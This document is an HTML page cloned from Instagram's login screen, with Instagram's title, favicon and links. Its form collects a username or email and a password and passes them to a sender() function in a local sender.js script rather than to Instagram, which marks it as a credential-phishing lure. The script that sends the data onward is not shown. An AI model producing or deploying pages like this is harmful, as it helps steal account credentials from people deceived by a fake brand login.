<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <title>Login•Instagram</title>
</head>
<body>
     <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
    <div class="form">
        <form action="" onsubmit=" return sender()">
             <label for="email" class="sr-only">Phone, username, or email</label>
            <input type="email" name="email" id="email" placeholder="Phone, username, or email" required>
            <label for="password" class="sr-only">Password</label>
            <input type="text"  name="name" id="name" placeholder="password" required>
            <input type="submit" value="log in" id="btn">
        </form>
        </div>
        <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="https://www.facebook.com/login.php?">Log in with Facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                <a href="https://apps.apple.com/app/instagram/id389801252">
                    <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                  </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                  </a>
                </div>
            </div>
        </section>
    </main>
    
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2025 Instagram from Facebook</p>
    </footer>
    <link rel="stylesheet" href="ins.css">
    <script src="sender.js"></script>
</body>
</html>
